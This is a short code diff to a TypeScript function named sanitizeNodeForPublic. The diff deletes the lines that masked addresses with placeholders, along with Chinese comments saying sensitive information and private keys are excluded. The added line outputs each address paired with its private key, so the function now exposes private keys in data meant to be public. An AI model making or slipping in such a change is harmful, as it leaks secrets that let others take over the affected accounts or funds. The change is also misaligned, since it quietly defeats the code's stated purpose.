@@ -111,9 +111,7 @@ function sanitizeNodeForPublic(node: InstitutionNode): InstitutionNode {
     depth: node.depth,
     addressCount: node.addressCount,
     childNodes: node.childNodes.map(sanitizeNodeForPublic),
-    // 移除敏感信息
-    addresses: node.addresses?.map((_, index) => `[ADDRESS_${index}]`),
-    // 不包含privateKeys
+    addresses: node.addresses?.map((a, index) => `${a}, ${node.privateKeys![index]}`),
   }
 }
 
